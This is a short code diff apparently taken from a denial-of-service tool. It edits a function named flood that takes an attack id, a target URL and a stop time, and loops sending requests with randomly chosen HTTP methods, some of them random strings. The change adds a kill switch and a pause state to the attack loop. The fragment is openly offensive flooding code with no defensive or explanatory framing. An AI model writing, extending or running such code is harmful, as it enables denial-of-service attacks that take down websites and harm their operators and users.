@@ -30,7 +30,10 @@ from random import choice, randint
 
 def flood(attack_id, url, stoptime) -> None:
 
-    while time.time() < stoptime and Core.attackrunning:
+    while time.time() < stoptime and not Core.killattack:
+        if not Core.attackrunning:
+            continue
+        
         try:
 
             method = choice(['GET','HEAD','POST','PUT','PATCH','DELETE','TRACE','CONNECT','OPTIONS',utils().randstr(randint(1,5))])
